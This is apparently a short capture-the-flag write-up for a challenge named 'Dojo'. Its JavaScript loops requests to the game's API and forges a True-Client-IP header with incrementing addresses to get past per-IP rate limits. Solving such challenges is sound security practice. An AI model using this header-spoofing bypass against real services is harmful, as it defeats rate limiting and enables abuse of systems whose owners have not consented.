# Dojo

Writeup:

```
let i = 0;
while (true) {
    try {
        const { total } = await (await fetch('/api/plunder', {
            headers: { 'True-Client-IP': `${i}.${i}.${i}.${i++}` }
        })).json();
        if (total > 800) break;
    } catch {}
}

let health = 2000;
while (health >= 0) {
    try {
        const { amount } = await (await fetch('/api/attack', {
            headers: { 'True-Client-IP': `${i}.${i}.${i}.${i++}` }
        })).json();
        health -= amount;
    } catch {}
}
```

![image-20240930230201904](https://api.2h0ng.wiki:443/noteimages/2024/09/30/23-02-29-0bda6973d414c1505feded438908383f.png)
